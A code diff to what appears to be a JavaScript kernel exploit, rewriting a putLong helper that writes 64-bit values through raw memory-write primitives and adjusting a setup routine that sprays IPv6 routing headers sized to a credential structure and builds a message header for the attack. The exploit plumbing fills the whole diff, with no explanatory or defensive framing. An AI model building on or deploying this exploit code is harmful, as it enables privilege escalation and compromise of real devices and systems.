@@ -119,13 +119,37 @@ Buffer.prototype.write32 = function(offset, value) {
 };
 
 Buffer.prototype.putLong = function(offset, value) {
-    const v = BigInt(value);
-    const addr1 = ptr_add(this.addr, offset);
-    const addr2 = ptr_add(this.addr, offset + 4);
+    let lo, hi;
 
-    mem.write32(addr1, Number(v & 0xFFFFFFFFn));
-    mem.write32(addr2, Number((v >> 32n) & 0xFFFFFFFFn));
+
+    if (typeof value === "bigint") {
+        lo = Number(value & 0xFFFFFFFFn);
+        hi = Number((value >> 32n) & 0xFFFFFFFFn);
+    }
+    
+    else if (value && Number.isInteger(value.lo) && Number.isInteger(value.hi)) {
+        lo = value.lo >>> 0;
+        hi = value.hi >>> 0;
+    }
+
+    else if (typeof value === "number") {
+        lo = value >>> 0;
+        hi = 0;
+    }
+ 
+    else if (value && typeof value.toBigInt === "function") {
+        const v = value.toBigInt();
+        lo = Number(v & 0xFFFFFFFFn);
+        hi = Number((v >> 32n) & 0xFFFFFFFFn);
+    }
+    else {
+        throw new Error("putLong(): valore NON valido → " + value);
+    }
+
+    this.addr.write32(offset, lo);
+    this.addr.write32(offset + 4, hi);
 };
+
 
 Buffer.prototype.fill = function(byte) {
     for (let i = 0; i < this.size; i++) {
@@ -787,9 +811,9 @@ function performSetup() {
        sprayRthdrLen = buildRthdr(sprayRthdr, UCRED_SIZE);
 		
         // Prepare msg iov buffer
-		msg.putLong(0x10, msgIov.addr.to_uint64());
+ 
 
-      //   msg.putLong(0x10, msgIov.addr); // msg_iov
+        msg.putLong(0x10, msgIov.addr); // msg_iov
         msg.putLong(0x18, MSG_IOV_NUM);      // msg_iovlen
 
 		
@@ -1526,6 +1550,7 @@ class WorkerState {
 }
 
 main();
+
 
 
 
